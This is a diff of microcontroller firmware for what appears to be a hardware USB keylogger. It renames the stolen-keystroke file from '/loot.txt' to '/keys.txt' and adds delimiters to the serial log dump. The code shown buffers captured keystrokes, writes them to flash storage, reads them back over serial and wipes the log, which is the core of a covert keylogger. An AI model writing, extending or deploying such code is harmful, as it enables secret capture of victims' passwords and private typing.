@@ -42,7 +42,7 @@ uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_
 // ======================================= Buffer Functions =============================================
 
 void openLogFile() {
-    File f = LittleFS.open("/loot.txt", "a");
+    File f = LittleFS.open("/keys.txt", "a");
     if (!f) {
         Serial.println("Error opening log file");
     }
@@ -58,7 +58,7 @@ void writeBufferedKey(char key) {
 }
 
 void flushBuffer() {
-  File f = LittleFS.open("/loot.txt", "a");
+  File f = LittleFS.open("/keys.txt", "a");
     if (bufferIndex > 0 && f) {
         f.write((const uint8_t*)keyBuffer, bufferIndex);
         f.flush();
@@ -68,7 +68,7 @@ void flushBuffer() {
 
 void closeLogFile() {
     flushBuffer();
-    File f = LittleFS.open("/loot.txt", "a");
+    File f = LittleFS.open("/keys.txt", "a");
     if (f) {
         f.close();
     }
@@ -107,19 +107,22 @@ void loop() {
 // ======================================= Serial Functions =============================================
 
 void readLogFile() {
-    File i = LittleFS.open("loot.txt", "r");
+    File i = LittleFS.open("keys.txt", "r");
     delay(200);
+    Serial.println("-------- LOGS ----------");
     if (i) {
       while (i.available()) {
         Serial.write(i.read());
       }
       i.close();
     }
+    Serial.println("------------------------");
     Serial.println("\n");
 }
 
+
 void clearLogFile() {
-    File i = LittleFS.open("loot.txt", "w");
+    File i = LittleFS.open("keys.txt", "w");
     delay(2000);
     if (i) {
       i.write("");
